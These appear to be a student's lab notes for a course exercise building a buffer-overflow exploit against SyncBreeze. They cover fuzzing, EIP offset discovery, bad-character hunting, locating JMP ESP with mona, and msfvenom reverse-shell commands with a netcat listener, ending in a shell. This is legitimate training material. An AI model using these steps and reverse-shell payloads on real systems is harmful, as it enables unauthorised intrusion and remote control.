Exercises

# 11.1.1.2
## 1. Build the fuzzer and replicate the SyncBreeze crash.
### Start the SyncBreeze service on our Windows 10 client machine from the Services App
![ce56977e64ed823c3a3ea5e2e52df4e0.png](../../_resources/11a140171edf4b22905b1160fb41000b.png)

### We already know the username field is vulnerable, let's sample the network traffic by launching Wireshark. Filter 'tun0' -> 'host 192.168.214.0'
![b9021acb7ad995ac78b65ea988b40354.png](../../_resources/060695a6fc4f4220b37f0eb78620b2fa.png)

### Open a browser and og into SyncBreeze with invalid credentials
[http://192.168.214.10/login](http://192.168.214.10/login)
![2c00450b1fa9beb29f666c4efdac0628.png](../../_resources/82cff510ed3d469f9c00f438b4626552.png)
![53801ebdc048da616b94ec88baf9435d.png](../../_resources/976ed920578e4a5ba32799da255af9ba.png)

### On Wireshark, follow the TCP stream and look for the POST request to log in.
We are looking for a [FIN, ACK] response from the Windows client. Review the 3-way handshake
![876cdee0ffacfd2826e6ad40195673c8.png](../../_resources/32604bf07e9c475f88700db6393bb102.png)

### Now replicate this HTTP communication by building a fuzzer script in Python.
[1_proof_of_concept.py](../../_resources/f26319784f4748cc86fdd7257a28fcc9.py)
![7bd632829f99a054fe2ff47d91a95c02.png](../../_resources/ecb52bf8f91f449e80d553f7f4bc272e.png)

### Now build a generation-based fuzzer that sends multiple HTTP requests with increasingly longer usernames. Here it is:
[2_fuzzer_username.py](../../_resources/bb4a67faa91f443d930049aad4b6332d.py)
![2e705641f1c98f16c53f1e4e9638f730.png](../../_resources/a13de0f82e534f90b913059cc25ee273.png)

### Start or restart SyncBreeze
![ea32fe6de792f084abdad5adffbed754.png](../../_resources/2db2634d39ac443c99c8f87230e05d03.png)

### Check what port it's listening on with TCP Viewer
![0cf0b98dfd333939996e27882d900840.png](../../_resources/47f9f3e677954c53b7d21600c3069d71.png)

### Look for syncbrs.exe PID. In this example, the PID is 3884
![60553221c01aeeb2dc103032978ac054.png](../../_resources/7bc96ffc352741c2bc4488b67da45fdf.png)

### Right-click the Immunity Debuuger Icon -> Run as administrator
![cbbc567f412614de3492fb1a79758d23.png](../../_resources/3159f6620b594c71bd1df31af8bd0ecb.png)

### The Immunity Debugger Launches. Attach by pressing File -> Attach
![5fa87b2172578b5c398e9f2ec588fc2a.png](../../_resources/82f38cc3c28a47f4b9f7e136bdd12254.png)

### Select the syncbreeze process. In this example, click on PID, then press Attach.
![1a52168fc6521b17b18f8b9e178d9742.png](../../_resources/bbb83c9f9e5c47ae8542667de7852496.png)

### We see the Syncbreeze service is attached but Paused.
![b63cf94ce1579459225f0af53d8dca97.png](../../_resources/92a4594f8c934e3babe97e56a104307d.png)

### Press F9 to unpause.
![cbcaab8f7fd54f660eb96af4960fd7d0.png](../../_resources/ca32983b4d854ed9b5fdae3c035e473a.png)

### Run the generational-based fuzzer script. The script hangs once 900 bytes is reached.
![a49b300061046dc1a23257a7b5dcccbf.png](../../_resources/1bb72a454aa742468d34aec3be56f0b1.png)

### We see that SyncBreeze has crashed, with EIP 41414141 and the debuufer has paused
![ddac99473e82070f07334576c0bd99fb.png](../../_resources/c964ab30d58547dba7e9fd8d77295833.png)

### This error message also pops up
![fd3460e4a6d873ac906a961e9792a63c.png](../../_resources/51258d58524f4c16aa35e4b395ed303b.png)


## 2. Inspect the content of other registers and stack memory. Does anything seem to be directly influenced by the fuzzing input?

Yes, the ESP has 12 bytes written to it at a higher numbered address on the stack. It seems to be overrun with our command line argument of A's.



# 11.2.3.1
## 1. Write a standalone script to replicate the crash.

Here is the standalone script:
[3_replicate_crash.py](../../_resources/91541da6d1a14d4abde5a48d9924848f.py)
![a3e0ebb5fc0b186e1bd96a16b518ec33.png](../../_resources/ece6727deae7465888615c45c348c689.png)

Here is the crash
![b6e4b1693b55fc9fe8ff6eae41410969.png](../../_resources/e8fc3d85c8d34d829a48be6f56452bd5.png)


## 2. Determine the offset within the input buffer to successfully control EIP.
### Run `msf-pattern_create -l 800`
![ef13a94711e22c7e992d691d14b0ad17.png](../../_resources/81dfb1505bf1496da55e3621accd5acd.png)

### Update the script to use the msf-pattern_create string
[4_determine_offset.py](../../_resources/27cc4a21e212485199211e231aaabcc8.py)
![3dc7a5edda520509a4cb77a8db44335a.png](../../_resources/3502c40fa78d4982ae1253a6129730de.png)


### We see it has crashed SyncBreeze. The EIP is 42306412
![68f3936c21a39f0a6124e9239dcb1d37.png](../../_resources/35a1df322bd040fc93a8420524c3e61a.png)

### Use msf-pattern_offset to find the exact offset where the crash occurred. We see it occurs at 780 bytes
`msf-pattern_offset -l 800 -q 42306412`
![131871dc4436a86a9cffcf4910740a7c.png](../../_resources/8f1667d2ed0d4de6bd99795221c83841.png)


## 3. Update your standalone script to place a unique value into EIP to ensure your offset is correct.
### We adjust the variables in the script with the expection of write all B's (42424242) to the EIP. Here is the script.
[5_verify_offset.py](../../_resources/0979d599aa104677b91e372ad67ef198.py)
![2154479d66c306174607272d3a41e6d3.png](../../_resources/1ebbee69016d4e33aa9157efcb35a57c.png)

Here is the crash output. The EIP points to 42424242
![bce68ab2caf5d8fc51a178aafa0e3a07.png](../../_resources/818ca3e23bf14dce877dc340ff11958d.png)


# 11.2.5.1
## 1. Repeat the required steps in order to identify the bad characters that cannot be included in the payload.
### Locate space for payload (shellcode). We will attempt to increase our buffer to 1500 bytes while still maintaining the same buffer overflow condition. Here is the code:
[6_placeholder_for_shellcode.py](../../_resources/7e7a2bf9a458401492711541e8a75013.py)
![b71e1ef651e2340c35b6dff566005d12.png](../../_resources/9fdb86261e8e4ac2b24df7297d56f277.png)

### Verify the crash points to our shellcode placeholder location (DDDD's)
![ee07a332d8a2982c2b532470f427c380.png](../../_resources/6d089660bcbc460e9cd4099e8792fef1.png)

### Start off with a script that holds all hex characters except 0x00, which has already been taken out because it is a known bad character.
Here is the script:
[7_check_bad_chars.py](../../_resources/5d72256c87ec4129b0042eb987c908c1.py)
![108607934f2cc79c0448bc1037be4cff.png](../../_resources/d76d7f1479ab4c8987491942c5db98dd.png)

### Verify the crash, then right-click the ESP and 'Follow in Dump'
![4552d24cdd837c4c6ae74ccaea8238a3.png](../../_resources/4cc35c41d6904a7096b6ea39e4769a2a.png)

We already know a bad character is 0x00. From this output, we see that 0x0a is another bad char
![902f1ae511da1c6487be031a110dd2bd.png](../../_resources/c047abfaa903497e8657f01b1d1a9655.png)

### Take out 0x0a from the script, and run again. The next bad char is 0x0d
![e61c5a5dd21532d54f21b35e29ae391e.png](../../_resources/698117ae08d744f3b08b58ce3d10d31a.png)

### Take out 0x0d, and run again. The next bad char is 0x25.
![67507f55d12b9310eeb06a9a0a0c91b9.png](../../_resources/2fe5ab7456c947018cff3bf26f7cfa1e.png)

### Take out 0x25, and run again. We see the next bad char is 0x26
![8ea7b84a6e39435a229fbf85d9aae71f.png](../../_resources/6a1a9d1e551b44ffbce75463dffd57e4.png)

### Take out 0x26, and run again. We see the next bad char is 0x2b
![4890a46e4d744853ed0b0455d964c0d0.png](../../_resources/c8c15129d4d743a4bf90c649a22459cf.png)

### Take out 0x2b, and run again. We see the next bad char is 0x3d
![b718b658873146d055208f0c06e3ebb8.png](../../_resources/5447860041b346fcb616dfd0619a721e.png)

### Take out 0x3d, and run again. We see it run to FF without skipping any characters. There are no more bad chars!
![c9ffc58c5e3c2c6bb24ac419565f8e04.png](../../_resources/b386d7096791453083fdb4b17bd906fd.png)

### Here is the script without any bad chars
[7_check_bad_chars.py](../../_resources/e055f74761224eacba560377991a4f88.py)
![a3fc7a657ef6aad94c5dfe0d7d2b6fd8.png](../../_resources/2b616503663e4a9abfc610c96f0a79c3.png)

The bad chars are: **x00\x0a\x0d\x25\x26\x2b\x3d**

## 2. Why are these characters not allowed? How do these bad hex characters translate to ASCII?

### ASCII control characters (e.g. backspace, vertical tab, horizontal tab, line feed etc), unsafe characters like space, \, <, >, {, } etc, and any character outside the ASCII charset is not allowed to be placed directly within URLs. 
Reference: https://www.urlencoder.io/learn/

0x00 → Null Character terminates strings. Non-printable
0x0a → Line Feed which terminates an HTTP field the same way as a carriage return. Non printable
0x0d → Carriage Return that signifies the end of an HTTP field (in this case username as part of HTTP POST request)

### The following printable characters are not allowed because they are reserved characters. The purpose of reserved characters is to provide a set of delimiting characters that are distinguishable from other data within a URI. URIs that differ in the replacement of a reserved character with its corresponding percent-encoded octet are not equivalent. Percent-encoding a reserved character, or decoding a percent-encoded octet that corresponds to a reserved character, will change how the URI is interpreted by most applications. 
Reference:  https://pretty-rfc.herokuapp.com/RFC3986#reserved

0x25 → Percent Sign (%)
0x26 → Ampersand (&)
0x2b → Plus sign (+)
0x3d → Equal sign (=)

Reference:
![8a4475c4557883ad7ce544bb2b3b47e9.png](../../_resources/e254afad94c149feac033fa36e798ee7.png)


# 11.2.7.1
## 1. Locate the JMP ESP that is usable in the exploit.

We see the syncbrs.exe and libssp.dll has SEH, ASLR, and NXCompat disabled.
However, syncbrs.exe will always contain null characters because it loads at 0x004XXXXX address.

### We will use libssp.dll because its address range won’t always contain bad characters 0x10000000
![43e68a2ff19411bd5ae1db8d60dded06.png](../../_resources/6a8585efd7d64c76b73432f52d25da4f.png)

### Find the opcode equivalent of JMP ESP using msf-nasm_shell commands. We see the code is FFE4
![1cca3222fdb51ac5a6e509bb9a324a1c.png](../../_resources/c491d586511245708df1317f6cdf0d3d.png)

### Now use mona.py to find  an address. We will input the following line:
!mona find -s "\xff\xe4" -m "libspp.dll"
![b24b4ea9ec82adf3b9795df26ddef2e8.png](../../_resources/ee6aa0976bf847be921c55f720e2c88d.png)


## 2. Update your PoC to include the discovered JMP ESP, set a breakpoint on it, and follow the execution to the placeholder shellcode.
### Here is the code with the JMP ESP added in
[8_eip_jmp_esp.py](../../_resources/6282db99fd1e46f0bfdbdb2b0a848bdb.py)
![aaea586b9c714885348bc37c11727ae5.png](../../_resources/72a0bb6f8aa94a288bcf796208cc1f09.png)
![1c55a424b7f49e4a0eeea0c6cbe31ead.png](../../_resources/73f1d55015644611a08ad91538da90ba.png)

### The crash. EIP is 10090C83
![8c9a83f57a04ee6891b6c30cfaa25d70.png](../../_resources/528e6f08914e454e9591dd40a124fd30.png)


# 11.2.9.1
## 1. Update your PoC to include a working payload.

Run msfvenom to create shellcode
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.214 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
![3ea25ba718e8acd49725d4d47c0c9381.png](../../_resources/c703c395a5694f1b8c419712eefcdb07.png)


## 2. Attempt to execute your exploit without using a NOP sled and observe the decoder corrupting the stack.

Here is the code with shellcode but **no NOPs**
[9_add_shellcode_no_nops.py](../../_resources/c7efe8952a764ada995cf155ad722500.py)
![d7ab6669771fa0c3b06742635dda6a2b.png](../../_resources/a68313efc32b467ba5d7c1661cfc641a.png)

The crash
![7f9989a4ebf71e6c179aa89c1354674e.png](../../_resources/3c2378c114434cbf9b4125f461e83922.png)


## 3. Add a NOP sled to your PoC and obtain a shell from SyncBreeze.

Here is the code with a NOP sled
[9_add_shellcode_yes_nops.py](../../_resources/e08eb3cfc776474ca653e8fa74aa126c.py)
![4b3b415e2473e5b7b0c81652b780ead9.png](../../_resources/aec417a20ccd43a9971ab1af48b1c335.png)

Start a Netcat listener on port 443
`sudo nc -lvnp 443`
![71ce9ac346d85914267035b83cdad59b.png](../../_resources/0f15f5eca537419dac928d0380d6bc94.png)

We have a shell
![409dec5c92efac016f59fd3835f411db.png](../../_resources/b9326bf718244ffab9a736851b2dc21a.png)


# 11.2.10.1
## 1. Update the exploit so that SyncBreeze still runs after exploitation.

Change the shellcode to use the ExitThread
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.214 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
![6074af374e100285ed4356235bafc7eb.png](../../_resources/aabdd270268942d0932d24206a08128a.png)

Here is the code
[10_exitThread.py](../../_resources/6d89d67cc9364da6a454cf73200197d0.py)
![b5682321087abb2026b5dc78995108be.png](../../_resources/c296e6e724544bd2beab860d4a78da0e.png)


Start a netcat listener
`sudo nc -lvnp 443`
![ee4eac4230f2a3c994410d92e30271e3.png](../../_resources/b86971c01afb42a8a9cea88dd53c7a4b.png)

We have a shell
![efe9f3fdd432a03d668b26bb0fbde885.png](../../_resources/f0674a65e8f947d38a7a780318e4fd45.png)


# 11.2.10.2 - Extra Mile
## In the Tools folder of your Windows VM, there are three applications called VulnApp1.exe, VulnApp2.exe, and VulnApp3.exe, each containing a vulnerability. Associated Python proof of concept scripts are also present in the folder. Using the PoCs, write exploits for each of the vulnerable applications.










